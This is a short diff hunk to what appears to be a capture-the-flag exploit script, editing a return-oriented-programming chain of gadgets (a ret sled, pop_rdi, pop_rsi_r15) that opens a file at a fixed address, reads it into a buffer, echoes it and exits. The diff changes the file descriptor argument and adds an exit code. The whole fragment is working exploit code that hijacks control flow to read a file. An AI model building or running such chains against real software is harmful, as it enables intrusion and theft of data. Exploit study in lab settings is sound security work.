@@ -36,11 +36,12 @@ exp2_papp = str(blob) + str(Page(0xf0000000, 3,
         ret, ret, ret, ret, ret, ret, ret, ret,
         pop_rdi, 0xf0000000,
         Xopen,
-        pop_rdi, 3,
+        pop_rdi, 2,
         pop_rsi_r15, 0xf0000800, 0x123,
         _read,
         pop_rdi, 0xf0000800,
         Xecho,
+        pop_rdi, 22,
         _exit
     ])))))
 
